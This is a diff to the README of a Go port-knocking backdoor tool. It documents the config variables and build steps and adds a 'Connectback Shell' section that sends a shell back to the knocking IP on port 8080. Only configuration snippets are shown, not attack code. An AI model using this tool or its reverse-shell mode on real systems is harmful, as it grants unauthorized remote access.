@@ -19,14 +19,28 @@ After the comparison is done and matches, a random port between 100 and 65535 wi
 targetInterface is the interface you want to be listening on. To be more district, you can also change the secretPorts to whatever you want.
 
 ```
-var targetInterface = "ens160"
-var secretPorts = []int{1, 2, 3, 4}
+var (
+	targetInterface = "ens160"
+	secretPorts = []int{1, 2, 3, 4}
+)
 ```
 
 To compile, you need libpcap. On linux, you can install by running `sudo apt install libpcap-dev`. Then you can run `go build src/vishnu.go` to generate a binary.
 
 For the port opening, make sure you have `inetd` installed. If you are not sure, run `apt install openbsd-inetd`.
 
+## Connectback Shell
+
+You can optionally have the backdoor operate in connectback mode - where after successfully knocking a shell is sent back to the knocking IP on a predetermined port. 
+
+Be careful doing this behind NAT as while knocking will work, the shell won't get back to you. You'll need to do port forwarding or listen for the shell on a public IP.
+
+```
+const (
+	connectback = true
+	connectbackPort = "8080"
+)
+```
 
 # Potential future works
 * Design it to work for multiple operation systems(https://haydz.github.io/2020/07/06/Go-Windows-NIC.html )
